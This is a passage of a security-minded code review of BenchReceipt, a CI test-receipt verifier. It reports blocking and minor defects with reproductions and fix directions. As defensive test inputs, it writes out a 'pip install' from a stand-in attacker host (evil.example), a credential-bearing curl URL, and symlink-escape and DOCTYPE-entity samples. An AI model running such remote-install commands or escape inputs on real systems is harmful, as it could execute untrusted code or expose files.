# P027 BenchReceipt — T013 Independent Review Findings

- **Reviewer:** fresh subagent session (did NOT build this code). **Model/route:
  Muse Spark (Muse model family, Meta) running on this VM** — a different
  model and a different session/route from the main builder, which used
  `gpt-6-luna` via WorkBuddy. No builder conclusion was copied or deferred
  to; every verdict below was re-derived from the code and from runnable
  reproductions written by this reviewer.
- **Branch:** `t013-review` (from `main` at `92744d4`).
- **Frozen candidate:** `cfede2711bc54567b918b1f85654c2dd42c30943`.
  Verified by this reviewer: `git diff cfede27..HEAD -- 02_source/src` is
  empty, and all 34 key production files are byte-identical to the frozen
  commit (SHA-256 checked per file against `04_review/REVIEW_INDEX.md`).
- **Spec:** v1.1.0. **Review date:** 2026-11-18 (UTC).
- **Coverage:** **34/34 key production files read in full**
  (`04_review/REVIEW_COVERAGE.csv`, validated by
  `check_review_coverage.py`, exit 0).
- **Counts: P0 = 0, P1 = 10, P2 = 17 new** (plus P2-01–P2-04 verified as
  documented, not re-reported).
- **Verdict: T014 MUST WAIT.** 10 P1 findings block the freeze
  (IMPLEMENTATION_PLAN §T013: P0/P1 → return to a FIX task).
  No P0 was found: no false `BOUND_PASS` reachable through the normal
  capture path, and no secret/execution hole in the shipped verifier was
  found. The P1s are: one wrong-`BOUND_PASS` logic defect in the shipped
  verifier on schema-valid (but non-capture) input (F-01), one privacy
  leak (F-09), one unreachable documented mode (F-10), and seven Oracle
  fidelity defects (F-02–F-08) that break the "same verdicts,
  independently derived" contract the S0 parity gate relies on.

## How the review was done

1. Read all 6 review packs and all 34 key production files in full at the
   frozen commit (plus `01_spec/PROJECT_BOOK.md` §§5.1–5.6, `11.1`,
   `02_source/docs/LIMITATIONS.md`, `03_evidence/privacy/SECURITY_FINDINGS.md`,
   `02_source/docs/REASON_CODES.md`, `BUNDLE_FORMAT.md`).
2. Verified the pack's inlined excerpts against the frozen files:
   `git_identity.py` (complete file), `determine_source_mode`,
   `verify.py` reason vocabulary / aggregation / identity / `evaluate`,
   `bundle.py` `_validate_rel_posix` / `_parse_manifest`, Oracle
   `REASON_STATUS` — all byte-identical to the frozen blobs.
   `verify_review_pack.py` independently confirms the same (PASS, exit 0).
3. For every suspicious point, wrote and ran a minimal reproduction
   (scripts preserved in `03_evidence/t013-review/repro*.py`, outputs in
   `repro-part*.log`). No finding below rests on reading alone.
4. Re-ran the acceptance commands fresh (see §Acceptance).

Repro baseline used in most findings: a 1-job copy of S0 fixture
`n02-two-job-pr-head` (receipt + green 10-test JUnit), policy
`source_mode="pr_head"`, `expected_workflow="CI"`, `min_tests=1`,
expected SHA `a…a` (40×`a`). Production verdict via
`benchreceipt.verify.evaluate`; Oracle verdict via
`node oracle/verify.mjs --policy <toml> --expected-source-sha <sha>
--evidence <dir>`.

## Severity scale (per task)

- **P0** = false PASS / security hole (can produce a wrong `BOUND_PASS`
  or leak/execute). **P1** = broken documented interface or fail-open
  behaviour. **P2** = observation / robustness note (non-blocking).

---

# P1 findings (block T014)

## F-01 — Verifier judges only the LAST JUnit report per job: a failing bound report is ignored when it is not last → wrong `BOUND_PASS`

- **File:** `02_source/src/benchreceipt/verify.py:591-626, 655-700`
  (report loop overwrites `junit_parsed` / `junit_path` on every `junit`
  rep; the summary comparison at ~655–700 and the exit-code check use
  only the final value). Same flaw independently present in the Oracle,
  `02_source/oracle/verify.mjs:522-528`.
- **Repro** (script `03_evidence/t013-review/repro3.py`, `R24`):
  1-job evidence, receipt `reports[]` = [`artifacts/junit-fail.xml`
  (10 tests, 2 failures), `artifacts/junit.xml` (10 tests, 0 failures)],
  both digests correct, receipt `junit` summary `(10,0,0,0)`,
  `command.exit_code = 0`. Run
  `evaluate(policy, "a"*40, evidence)`.
- **Observed:** production `BOUND_PASS`, `jobs_verified=1`, zero reason
  codes; Oracle also `BOUND_PASS` (exit 0). With the two report entries
  swapped, both correctly return `INVALID / JUNIT_SUMMARY_MISMATCH`.
  The verdict therefore depends on report order, and a bound report
  with failures is silently ignored when it is not last.
- **Why P1, not P0:** a receipt with two same-kind `junit` entries is
  schema-valid (`reports` `maxItems: 32`, no uniqueness rule) but
  `capture` can never emit it (single `--junit` flag), so reaching this
  state requires hand-assembling/forging the receipt. Receipts are
  unsigned by design (LIMITATIONS §1), so an author with receipt-write
  access could forge a clean single-report receipt directly — this
  defect grants no new attacker capability. It is nevertheless a real
  logic defect on schema-valid input through the normal `verify` entry
  point, violating PROJECT_BOOK §5.4 ("`failures = 0`, `errors = 0`").
- **Fix direction:** judge *every* `junit` report against the summary
  (and fail on any parsed report with failures/errors, or on any
  summary/parse disagreement), not just the last one. Add an S0-style
  fixture with two same-kind reports.

## F-02 — Oracle never parses LCOV: malformed LCOV verifies `BOUND_PASS` in the Oracle

- **File:** `02_source/oracle/verify.mjs:29-51` (`REASON_STATUS` has no
  `LCOV_MALFORMED` entry), `:499-534` (report loop parses only
  `rep.kind === "junit"` at :524; an `lcov` rep is only hash-checked).
  No `parseLcov` exists anywhere in the file (`grep -c lcov` = 3, all
  the `REPORT_MISSING` kind loop).
- **Repro** (`repro2.py`, `R2`): n02 1-job evidence, policy
  `reports.lcov = "required"`, add `artifacts/lcov.info` with bytes
  `TN:\nSF:src/foo.py\nDA:1,1\nBADTAG:zzz\nend_of_record\n`, receipt
  digest/size correct.
- **Observed:** production `INVALID / LCOV_MALFORMED`, jobs 0;
  Oracle `BOUND_PASS`, jobs 1, exit 0.
- **Impact:** the independent check blesses an input the shipped
  verifier rejects. S0 parity (50/50) holds only because no S0 fixture
  contains a malformed LCOV file — the parity claim is not evidence of
  equivalence on this input class. If production ever regressed its
  LCOV check, the gate would not catch it.
- **Fix direction:** implement LCOV format+path validation in the Oracle
  (mirroring `reports/lcov.py`, including `LCOV_MALFORMED` in the
  vocabulary) and add a malformed-LCOV fixture to S0.

## F-03 — Oracle never checks JUnit count attributes: attribute/count mismatch verifies `BOUND_PASS` in the Oracle

- **File:** `02_source/oracle/verify.mjs:253-272` (`parseJUnitMinimal`
  counts tags by regex and never reads `tests`/`failures`/`errors`/
  `skipped` attributes). Production checks them in
  `02_source/src/benchreceipt/reports/junit.py:118-133`
  (`_check_count_attrs`).
- **Repro** (`repro2.py`, `R3`): JUnit file with 10 real testcases but
  `tests="999"` on `<testsuite>`, receipt summary `(10,0,0,0)`, digests
  correct.
- **Observed:** production `INVALID / JUNIT_MALFORMED`; Oracle
  `BOUND_PASS`, exit 0.
- **Fix direction:** Oracle must read and compare the count attributes
  (per `<testsuite>` and `<testsuites>` wrapper) exactly as production
  does, returning `JUNIT_MALFORMED` on mismatch.

## F-04 — Oracle JUnit "parser" is regex counting, not XML parsing: malformed XML and DOCTYPE pass; CDATA/comments counted; bare self-closing elements missed

- **File:** `02_source/oracle/verify.mjs:253-272`.
- **Repros** (`repro2.py` R4, `repro3.py` R4a2/R4b2, `repro4.py` R4a3/R4g;
  all with correct digests and summaries matching the *production*
  counts):
  - R4d unclosed `<testcase>` (`<testsuite …><testcase></testsuite>`):
    production `INVALID / JUNIT_MALFORMED`; Oracle `BOUND_PASS`.
  - R4e `<!DOCTYPE testsuite [<!ENTITY x "y">]>`: production `INVALID /
    JUNIT_MALFORMED`; Oracle `BOUND_PASS`.
  - R4a3 `<testcase><![CDATA[<failure >oops</failure>]]></testcase>`:
    production `BOUND_PASS` (CDATA is text, 0 failures); Oracle
    `INVALID / JUNIT_SUMMARY_MISMATCH` (regex counts the CDATA text).
  - R4b2 `<!-- <failure> -->` comment: production `BOUND_PASS`; Oracle
    `INVALID / JUNIT_SUMMARY_MISMATCH`.
  - R4c bare `<testcase/>` (no attributes): production counts 1 test →
    `BOUND_PASS`; Oracle counts 0 → `INVALID / JUNIT_SUMMARY_MISMATCH`.
    Same for bare `<failure/>` / `<error/>`: the regexes
    `/<failure[\s>]/`, `/<error[\s>]/`, `/<testcase[\s>]/` require a
    space or `>` after the tag name, so self-closing forms are missed
    (only `<skipped[\s/>]/` includes `/`). R4g: `<failure/>` counted
    by production (`JUNIT_FAILED`) but missed by the Oracle (different
    reason codes: Oracle adds `JUNIT_SUMMARY_MISMATCH`).
  - R4f namespaced `<x:testcase>`: production counts it (local-name
    handling); Oracle misses it → `INVALID / JUNIT_SUMMARY_MISMATCH`.
- **Impact:** the Oracle both false-passes (malformed/DOCTYPE XML) and
  false-blocks (CDATA/comments/namespaced/self-closing forms) on JUnit
  inputs. Its verdicts on report content are not the same verdicts.
- **Fix direction:** replace regex counting with a real XML parser in
  the Oracle (Node has no stdlib XML parser; a minimal well-formedness
  + element-counting parser, or a vendored dependency-free parser,
  with DOCTYPE rejection and count-attribute checks), plus adversarial
  JUnit fixtures in S0.

## F-05 — Oracle report-path containment is lexical only: a symlinked report escaping the job dir verifies `BOUND_PASS` in the Oracle

- **File:** `02_source/oracle/verify.mjs:499-501`
  (`resolve(jobDir, rel)` + `target.startsWith(root + "/")`).
  Node `path.resolve` is lexical — it does **not** resolve symlinks.
  Production uses `Path.resolve()` (`verify.py:211-217`,
  `_is_within_root`), which does resolve them.
- **Repro** (`repro3.py`, `R5`): `artifacts/junit.xml` is a symlink to
  `/tmp/t013-repro/work3/outside.xml` (good green JUnit), receipt
  digest/size match the outside file's bytes.
- **Observed:** production `INVALID / REPORT_HASH_MISMATCH`;
  Oracle `BOUND_PASS`, exit 0.
- **Fix direction:** Oracle must resolve symlinks before the containment
  check (`fs.realpathSync` on the target and the root) and refuse
  symlinked report paths, mirroring production and `bundle.py`
  (`_check_receipt_reports` `is_symlink` check).

## F-06 — Oracle receipt validation is far weaker than `run.v1`: schema-invalid receipts verify `BOUND_PASS` in the Oracle

- **File:** `02_source/oracle/verify.mjs:118-189`
  (`receiptStructuralError` — required fields + SHA patterns only).
  It does not enforce `additionalProperties: false`, `maxLength` /
  `maxItems` / `maximum` bounds, `job_id` / `matrix` property patterns,
  `run_attempt` maximum (100000), `size_bytes` maximum (1 GiB), or
  `junit` count maxima.
- **Repro** (`repro3.py`, `R7a`): n02 receipt with
  `ci.run_attempt = 200000` (schema maximum 100000) **and** an extra
  top-level field `"extra_forged_field": "BOUND_PASS"`.
- **Observed:** production `INVALID / INVALID_RECEIPT`; Oracle
  `BOUND_PASS`, exit 0.
- **Fix direction:** make the Oracle's structural check cover the
  schema bounds that affect verdicts (at minimum: no additional
  properties, integer ranges, `maxItems`/`maxLength`/`maximum`), or
  have the Oracle load and enforce the frozen JSON schemas. Add
  schema-confusion fixtures to S0 that exercise the Oracle.

## F-07 — Oracle TOML parser silently accepts duplicate keys (last wins) and mishandles valid TOML

- **File:** `02_source/oracle/verify.mjs:66-110`
  (`parseToml`: `section[key] = parseTomlValue(...)` overwrites without
  a duplicate check; no comment stripping; no string-escape handling).
- **Repros** (`repro4.py` R6a-redo, `repro3.py` R6b, `repro5.py` R6c;
  single-job policy so the matrix is not confounded):
  - R6a: policy with `min_tests = 5` followed by `min_tests = 0`
    (duplicate key): Python `tomllib` rejects → `INVALID_POLICY`;
    Oracle silently takes `0` → `BOUND_PASS`, exit 0.
  - R6b: `min_tests = 1  # trailing comment` (valid TOML): Python
    accepts; Oracle throws → `INVALID_POLICY` (false block).
  - R6c: `expected_workflow = "CI\"X"` (escaped quote): Python parses
    `CI"X`; Oracle keeps the raw backslash (`CI\"X`), so the workflow
    comparison can diverge.
- **Fix direction:** make the Oracle TOML parser reject duplicate keys
  and duplicate sections, strip trailing comments, and process string
  escapes exactly as `tomllib` does (or formally restrict the policy
  file to a documented subset and reject everything else on *both*
  sides identically).

## F-08 — Oracle CLI has no `--expected-run-id` / `--expected-attempt` support: a pinned wrong run verifies `BOUND_PASS` in the Oracle

- **File:** `02_source/oracle/verify.mjs:636-644` (`parseArgs` reads only
  `--policy`, `--expected-source-sha`, `--evidence`); `evaluate()` has
  no expected-run parameters. Production implements the pin in
  `verify.py:516-535` and `cli.py`.
- **Repro** (`repro3.py`, `R16`): control evidence, Oracle CLI with
  `--expected-run-id WRONG-RUN --expected-attempt 99` → `BOUND_PASS`,
  exit 0 (flags silently ignored); production
  `evaluate(..., expected_run_id="WRONG-RUN", expected_attempt=99)` →
  `UNBOUND / RUN_ID_MISMATCH, RUN_ATTEMPT_MISMATCH`.
- **Fix direction:** add the two flags to the Oracle CLI and `evaluate`,
  with the same validation (non-empty run id, attempt 1..100000), and
  cover them in `verify.test.mjs` and S0.

## F-09 — Secret redaction misses common secret flag names and path forms: secrets and absolute paths leak verbatim into `command.display`

- **File:** `02_source/src/benchreceipt/command.py:59,88-133,154-167`
  (`SECRET_HINTS = ("token", "password", "secret", "api-key", "apikey",
  "api_key")`; `_shorten_path_token` / `_basename_of_absolute` handle
  only leading-`/` and `C:\`/`C:/` paths, and only whole tokens or
  `--key=/abs` values).
- **Repro** (`repro2.py`, `R1b` — neutral values, no hint substring in
  the value itself):
  `display_command(["pytest", "--key", "hunter2"])` →
  `"pytest --key hunter2"` (leaked); same for `--auth abc123`,
  `--passwd hunter2`, `--passphrase hunter2`,
  `--private-key MIIEvAIBADANBgkqhkiG9w0BAQEFAASC`,
  `--credential hunter2`; `curl https://user:s3cret@example.com/x` →
  credentials leaked verbatim; UNC `\\server\share\file.txt` leaked;
  `file:///home/sam/file.txt` leaked; `prefix:/home/sam/file.txt`
  leaked. The spec-named forms **are** honoured (verified:
  `--token`/`--api-key`, both `=` and following-value forms, →
  `[REDACTED]`).
- **Why P1:** `run.v1.json` says `command.display` "must not contain
  secrets", and LIMITATIONS §6 states "secrets in argv are redacted to
  `[REDACTED]` in `command.display`" — both absolute claims, not
  limited to the four named hints. Receipts are bundled and uploaded as
  CI artifacts, so this is a real exfiltration path for a secret passed
  under a common flag name. The project's own privacy scanner already
  treats `passwd`/`pwd`/`auth-token`/`private-key` as secret names
  (`scripts/privacy_scan.py:SECRET_KEY_RE`) while the redactor does
  not — an internal inconsistency. (PROJECT_BOOK §11.1 line 627 names
  only `token/password/secret/api-key`; if that list is meant to be
  exhaustive, the schema/LIMITATIONS wording must be narrowed instead —
  either way the documented interface and the code disagree.)
- **Checked safe:** truncation to 512 chars happens *after* redaction
  (`repro6.py` R1c: 512-char display, secret value absent), so no
  secret tail can leak through truncation.
- **Fix direction:** widen `SECRET_HINTS` to the scanner's list
  (at least `key`, `auth`, `passwd`, `pwd`, `passphrase`, `credential`,
  `private-key`) and shorten/strip UNC (`\\…`), `file://`, embedded
  (`prefix:/abs`) and credential-bearing URL tokens; add adversarial
  redaction tests for these forms.

## F-10 — `explicit_sha` source mode is unreachable from `capture`: a policy using it can never verify

- **File:** `02_source/src/benchreceipt/capture.py:222-240`
  (`determine_source_mode` has no `explicit_sha` branch; it returns
  only `pr_head` / `merge_commit` / `event_sha`). The mode exists in
  the frozen enums (`run.v1.json`, `policy.v1.json`) and in S0 fixture
  `n07-single-explicit-sha` (hand-written receipt, generic provider).
- **Repro** (`repro5.py`, `R11`): real `capture()` in a scratch git
  repo (local run, no CI env) → receipt `git.source_mode =
  "event_sha"`. Verifying that receipt against a policy with
  `source_mode = "explicit_sha"` → `UNBOUND / SOURCE_MODE_MISMATCH`
  (jobs 0). There is no CLI flag (`--source-mode`, `--expected-sha`)
  on `capture` that could produce `explicit_sha`.
- **Impact:** a documented mode that no producer can emit; any user
  following the docs into an `explicit_sha` policy gets a permanent
  false block. Fail-closed (never a false pass), but a broken
  documented interface.
- **Fix direction (spec decision):** either add an explicit-SHA capture
  path (e.g. `capture --source-mode explicit_sha --expected-sha <sha>`)
  or remove/document `explicit_sha` as receipt-only (third-party
  producers) and state that `capture` never emits it.

---

# P2 findings (non-blocking observations)

## P2-05 — Schema validator pattern anchoring: `re.search` + `$` accepts a trailing newline, so patterns are not full-string matches

- **File:** `02_source/src/benchreceipt/schema.py:227-237`
  (`re.search(schema["pattern"], value)`; all frozen patterns use
  `^…$`, and in Python `$` matches before a trailing `\n`).
  Same shape in `cli.py:70,189` (`_SHA40_RE` with `re.match`).
- **Repro** (`repro.py`, `R8`): receipt with `git.head_sha =
  "a"*40 + "\n"` and with `reports[0].path = "artifacts/junit.xml\n"`
  both pass `validate_against_schema(…, "run")`.
- **Impact:** none found for a pass — downstream checks catch these
  (`head_sha != expected` → `SOURCE_SHA_MISMATCH`; the newline path is
  not found → `REPORT_MISSING`). The validator is weaker than the
  schema text claims, and a future caller that trusts validation alone
  would be misled.
- **Fix:** use `re.fullmatch` (or `\Z` anchors) for pattern checks.

## P2-06 — Giant-integer `int()` conversions leak `ValueError` instead of the documented error types

- **Files:** `reports/junit.py:128` (`int(raw)` in `_check_count_attrs`),
  `reports/lcov.py:141,181,191,200,205,214,218,220` (`int()` in
  `_parse_int` / record parsing), `bundle.py:461`
  (`int(size_text)` in `_parse_manifest`).
- **Repros:** JUnit `tests` attribute of 5000 digits → `parse_junit`
  raises raw `ValueError` ("Exceeds the limit (4300 digits)…"), not
  `JUnitError` (`repro4.py` R9); `verify` then returns
  `INTERNAL_ERROR` instead of `INVALID / JUNIT_MALFORMED`, and
  `capture` raises raw `ValueError` instead of `CaptureError`
  (`repro6b.py` R9c; CLI maps it to exit 4, no receipt written).
  Same for a 5000-digit LCOV `DA` line number (R9b) and a 5000-digit
  manifest size (R10: `ValueError` propagates out of `verify_bundle`,
  where the CLI's top-level guard turns it into exit 4).
- **Impact:** fail-closed everywhere (no pass, no receipt), but the
  wrong error class/status: an adversarial oversized integer becomes
  an `INTERNAL_ERROR` instead of a clean `INVALID`.
- **Fix:** bound digit length before `int()` (or catch `ValueError`
  and raise `JUnitError` / `LcovError` / `BundleProblem`).

## P2-07 — `evaluate()` can return a `result.v1`-schema-invalid result when the bundle is very large

- **File:** `02_source/src/benchreceipt/verify.py:786-812` (fallback
  result built when the computed result fails `result.v1` validation).
- **Repro** (`repro5.py` R13 / `repro6.py` R13b): evidence dir with
  the 1 control job + 130 invalid receipt dirs. `evaluate` returns
  `INVALID / INVALID_RECEIPT` with `unexpected_jobs` = 130 entries —
  but `result.v1.json` caps `unexpected_jobs` at `maxItems: 128`, so
  the returned dict itself fails schema validation
  (`$.unexpected_jobs: 130 items, more than maxItems 128`). The CLI
  then rejects its own verifier output (`validate_against_schema`
  fails → exit 4, no `--out` file written).
- **Impact:** fail-closed (exit 4, nothing passes), but the
  `evaluate()` return contract ("returns a `benchreceipt.result/v1`
  dict") is broken, the 130 underlying `INVALID_RECEIPT` errors are
  collapsed to one mislabelled code, and the CLI produces no result
  file for diagnosis.
- **Fix:** cap/truncate the list fields (or the error lists) to the
  schema maxima when building results, and re-validate the fallback
  before returning it.

## P2-08 — An invalid `--expected-source-sha` is reported as `INVALID_POLICY` with a policy message

- **File:** `02_source/src/benchreceipt/verify.py:379-389`.
- **Repro** (`repro.py`, `R25`): `evaluate(policy, "NOT-A-SHA",
  evidence)` → `INVALID / INVALID_POLICY`, message "policy is not
  valid benchreceipt.policy/v1" — but the policy is valid; the bad
  input is the caller's expected SHA.
- **Fix:** distinct code/message for a malformed expected SHA
  (or reuse `INVALID_EVIDENCE`-style wording naming the SHA).

## P2-09 — A dirty tree at capture start is not independently enforced

- **File:** `02_source/src/benchreceipt/verify.py:562-565` (only
  `dirty_before != dirty_after` and `require_clean_source_after and
  dirty_after` are checked).
- **Repro** (`repro5.py`, `R12`): receipt with `dirty_before =
  dirty_after = True`, identical before/after digests, policy
  `require_clean_source_after = false` → `BOUND_PASS`, jobs 1.
  The tests therefore ran against uncommitted changes, yet the
  verdict is a pass and the result carries no dirty flag.
- **Note:** PROJECT_BOOK §5.5 says "默认要求开始时 tracked worktree
  clean" (clean at start is the default requirement). With
  `require_clean_source_after = true` (the example policy) this case
  is caught via `dirty_after`; the gap only opens when a policy
  explicitly opts out of clean-after.
- **Fix (spec decision):** clarify whether dirty-before is allowed
  when clean-after is not required; if not, add a
  `require_clean_source_before`-style rule (or always fail on
  `dirty_before` unless the policy opts in).

## P2-10 — Nested `<testsuite>` count attributes are never checked

- **File:** `02_source/src/benchreceipt/reports/junit.py:150-175`
  (`parse_junit` calls `_check_count_attrs` only on the root /
  top-level suites).
- **Repro** (`repro4.py`, `R21`): outer `<testsuite tests="1"
  failures="0">` containing a nested `<testsuite tests="99"
  failures="99">` with 1 testcase → parses as
  `{tests: 1, failures: 0, …}`; the inner `tests="99"` /
  `failures="99"` are silently ignored.
- **Impact:** none for a pass — counted elements are the truth and
  the ignored attributes cannot inflate counts. Lenient acceptance
  of structurally invalid JUnit only.
- **Fix:** reject nested `<testsuite>` elements, or check their
  attributes too.

## P2-11 — Report-path `.` segments: schema allows, `verify` passes, `bundle` rejects

- **Files:** `02_source/schemas/run.v1.json` (`reports[].path`
  pattern allows `.` segments — it only forbids `..`), vs
  `02_source/src/benchreceipt/bundle.py` (`_validate_rel_posix`
  rejects `.` segments).
- **Repro** (`repro4.py`/`repro5.py`, `R28/R28b`): receipt report path
  `artifacts/./junit.xml` passes schema validation and `verify.py`
  returns `BOUND_PASS` (resolution stays inside the job dir);
  `verify_bundle` on the same bundle returns `ok=False` with
  `REPORT_HASH_MISMATCH` for that path.
- **Impact:** the two checkers disagree on a harmless input; no
  escape is possible (resolved path stays inside the root).
- **Fix:** align the two (either forbid `.` segments in the schema
  pattern or accept them in `_validate_rel_posix`).

## P2-12 — `build_bundle` cleanup runs only on `BundleError`: an I/O failure mid-copy leaves a half-written output dir

- **File:** `02_source/src/benchreceipt/bundle.py:354-365`
  (`except BundleError: shutil.rmtree(dst_root, …)`).
- **Repro** (`repro5.py`, `R17`): monkeypatch `shutil.copyfile` to
  raise `OSError` on the receipt copy → `build_bundle` propagates
  the `OSError` and the half-written `out_dir` remains.
- **Impact:** low — the manifest is written last, so the leftover dir
  has no `SHA256SUMS.txt` and `verify_bundle` raises `BundleError`
  ("not a bundle directory") rather than mistaking it for a bundle.
  Stale directory only.
- **Fix:** clean up on any exception (`except Exception`), not just
  `BundleError`.

## P2-13 — Workflow validator accepts a remote `.whl` URL as a "local install"

- **File:** `02_source/scripts/validate_workflow_example.py:93,364-368`
  (a `pip install` line passes if its args contain `"./"` or `".whl"`).
- **Repro** (`repro5.py`, `R26`): `ci.yml` with
  `pip install https://evil.example/x.whl` → `validate_workflow_text`
  returns no errors.
- **Impact:** validator-only (the shipped example file is clean); the
  "install from a local path only" check would not catch a remote
  wheel URL.
- **Fix:** require the install target to be a local path / local file
  URL, not any string containing `.whl`.

## P2-14 — S0 gate threshold 8 is partly vacuous: `network_requests` is a hardcoded 0 and the gate never runs the socket audit

- **Files:** `02_source/scripts/performance_smoke.py:151`
  (`"network_requests": 0` — a literal, not a measurement);
  `02_source/scripts/s0_gate.py:192-200,269` (threshold 8 =
  token-scan of `verify.py` + Oracle **and**
  `perf.get("network_requests") == 0` — the literal above).
  `s0_gate.py` never invokes `offline_check.py`, which is the script
  that actually performs the dynamic socket audit
  (`sys.addaudithook`, 0 `socket.connect`/`getaddrinfo` events).
- **Impact:** the offline property itself is genuinely proven by
  `offline_check.py` standalone (re-run by T012, PASS), but the S0
  gate's threshold-8 evidence for "external network requests = 0"
  is half a constant. A future network call in the measured path
  would not be caught by the gate.
- **Fix:** have the gate run `offline_check.py` (or its dynamic
  trace) and use that measured count for threshold 8.

## P2-15 — Oracle has no `INTERNAL_ERROR`: unknown codes map to `INVALID`, and its CLI prints no result JSON on internal error

- **File:** `02_source/oracle/verify.mjs:27,29-51,636-664`
  (`STATUS_ORDER` lacks `INTERNAL_ERROR`; `REASON_STATUS` lacks
  `INTERNAL_ERROR`; `aggregateStatus` maps an unknown code to
  `"INVALID"`; `main()` catches `evaluate` exceptions with
  `process.stderr.write(...)` + `exit(4)` and no JSON).
- **Impact:** contract divergence from production (`verify.py`
  `_enforce_vocabulary` → `INTERNAL_ERROR` result; `evaluate` never
  raises). A verifier bug in the Oracle would ship an unfrozen code
  as a finding instead of failing closed to `INTERNAL_ERROR`.
- **Fix:** add `INTERNAL_ERROR` to the Oracle vocabulary and status
  order, enforce it, and print an `INTERNAL_ERROR` result JSON on
  internal error.

## P2-16 — Policy `schema_version = true` passes the `const: 1` check (Python `True == 1`)

- **File:** `02_source/src/benchreceipt/schema.py:155-156`
  (`value != schema["const"]`; no `type` on `schema_version` in
  `policy.v1.json`, so the bool is never rejected). The Oracle
  rejects it (`!== 1`).
- **Repro** (`repro.py`, `R19`): `validate_policy` with
  `schema_version: True` → accepted.
- **Impact:** none on verdicts (`schema_version` is not used by
  `verify` beyond validation); a cross-implementation divergence on
  weird input, and a schema that admits a non-integer version.
- **Fix:** add `"type": "integer"` to `schema_version` in
  `policy.v1.json` (or make `const` checks type-strict).

## P2-17 — Dead code and a stale docstring

- `02_source/src/benchreceipt/command.py:88-94` — `_flag_name` is
  defined but never called (verified by grep: 1 occurrence).
- `02_source/src/benchreceipt/verify.py:591,624` — `junit_file_ok` is
  assigned (`False`, then `True`) but never read.
- `02_source/src/benchreceipt/__init__.py:1-7` — docstring still says
  "Skeleton placeholder… Status: NOT_VERIFIED until S0 passes";
  S0 has passed (re-run this review: 10/10).
- Cosmetic; no behaviour impact.

## P2-18 — `verify` reads symlinked `receipt.json` / job dirs straight through

- **File:** `02_source/src/benchreceipt/verify.py:280,284`
  (`child.is_dir()` and `receipt_path.is_file()` follow symlinks).
- **Repro** (`repro7.py`, P2-O): `receipt.json` replaced by a symlink
  to a copy elsewhere → `BOUND_PASS`.
- **Impact:** low — the content is still schema-validated and all
  report digests are re-computed; the bundle layer refuses symlinks
  while raw `verify` does not (inconsistent depth). A symlinked
  receipt pointing at another job's receipt is still subject to
  duplicate/matrix checks.
- **Fix (optional):** refuse symlinked receipts/job dirs in
  `_load_receipts`, matching the bundle layer.

## P2-19 — Privacy scanner coverage gaps

- **File:** `02_source/scripts/privacy_scan.py:54-56,85-90,161-167`.
  The scanner does not flag `/tmp/…` paths (the S0 gate's own
  pattern list does), does not cover Windows UNC paths
  (`\\server\share`), skips files over 10 MiB as "skipped" without a
  finding, and only scans `*.json` / `*.toml` / `SHA256SUMS.txt` —
  never report artifacts (documented in LIMITATIONS §6, but a
  secret in JUnit failure text therefore escapes both the receipt
  checks and the scanner).
- **Impact:** detection gaps only; the scanner's latest run (184
  files, 0 findings) is still valid for what it covers.

## P2-20 — `build_fixtures.py` rebuilds the frozen fixture set with no guard flag

- **File:** `02_source/scripts/build_fixtures.py:231-236, main()`
  (`write_fixture` does `shutil.rmtree(fdir)` on an existing fixture
  dir; `main()` takes no `--force` / confirmation).
- **Impact:** low — rebuilds are deterministic (fixed SHAs and
  timestamps) and any change would show in `git diff`. But a
  mistaken re-run after a builder edit silently rewrites the frozen
  set the S0 gate trusts.
- **Fix:** require an explicit `--force` to overwrite existing
  fixtures.

## P2-21 — Whitespace-only `--expected-run-id` is accepted as a pin

- **File:** `02_source/src/benchreceipt/verify.py:365-371`
  (only non-empty strings are rejected); `cli.py` checks `not
  args.expected_run_id` (empty only).
- **Repro** (`repro7.py`, P2-S): `evaluate(..., expected_run_id=" ")`
  → accepted, every job mismatches → `UNBOUND / RUN_ATTEMPT_MISMATCH`
  (fail-closed, false block).
- **Fix:** strip/validate the pin the same way `ci_metadata._clean`
  treats empty strings (`_clean` → `None`).

## Known P2-01–P2-04 — verified as documented (NOT re-reported)

Re-checked by this reviewer, each as stated in
`02_source/docs/LIMITATIONS.md` and
`03_evidence/privacy/SECURITY_FINDINGS.md`:

- **P2-01** transient mutate-and-revert undetectable — by construction
  of any before/after snapshot scheme; no code change can fix it
  without continuous monitoring. Agree, carries.
- **P2-02** no byte cap on `receipt.json` itself — reproduced
  (`repro5.py`): a 2 MB whitespace-padded otherwise-valid receipt
  still verifies `BOUND_PASS`, verdict correct. Agree, carries.
- **P2-03** manifest sort order unenforced — reproduced (`repro4.py`
  R23): a reordered-alone manifest still verifies `ok=True`; a
  flipped byte in a reordered manifest is still caught. Agree, carries.
- **P2-04** bare CR inside an LCOV `SF:` path preserved verbatim —
  reproduced (`repro5.py` R22): `parse_lcov` returns
  `source_file='src/foo\rbar.py'`; the value never reaches a receipt
  (no LCOV summary field). Agree, carries.

## Points checked and found sound (no finding)

- **P0-01 fix (ADR-005):** after-fields present and enforced in both
  implementations; S0 fixtures e5 (clean-tree HEAD change) and e6
  (empty commit) are caught by both. `determine_source_mode` branches
  all re-derived (R15): every branch's expected SHA comes from CI
  metadata or the real HEAD, and every disagreeing branch fails closed
  at `verify` (`SOURCE_SHA_MISMATCH`). `git_identity` never fabricates
  a SHA; `_rev_parse` requires exactly 40 lowercase hex; unavailable
  snapshots are `dirty=True` with no digest.
- **Hash/digest handling:** canonical JSON (sorted keys, compact,
  UTF-8, `allow_nan=False`) is deterministic; `_hash_file` streams in
  1 MiB chunks with the 1 GiB cap enforced during streaming; bundle
  manifest entries are re-hashed after copy; `verify_bundle` and
  `verify` recompute from disk and never trust stored digests.
- **Fail-closed:** `evaluate` never raises for bad input (unexpected
  exceptions → `INTERNAL_ERROR`); empty reason set is the only path
  to `BOUND_PASS`; aggregation precedence is total
  (`INTERNAL_ERROR > INVALID > UNBOUND > BOUND_FAIL > BOUND_PASS`);
  invalid receipts count as present for the matrix, never verified,
  never a reference value; duplicates never count twice.
- **Path containment (production):** `_validate_rel_posix`,
  `_is_within_root` (resolving), symlink refusal at build and at
  verify, manifest parsing (CR / duplicates / self-listing /
  unsafe paths all problems, never silent).
- **HTML renderer:** every interpolated value passes through
  `html.escape(…, quote=True)` (verified by reading all render
  functions); no external resource references; no argv/secret/absolute
  path is embedded; unknown statuses/codes are labelled unknown, never
  shown as a pass.
- **CLI contract:** exit codes 0/1/2/3/4 via `status_to_exit_code`;
  missing/invalid `--expected-source-sha` → exit 3 (not argparse 2);
  `--expected-run-id` / `--expected-attempt` validated; `report`
  refuses unparsable input (exit 3); `bundle` verify failure → exit 3;
  top-level guard converts unexpected exceptions to exit 4 with a
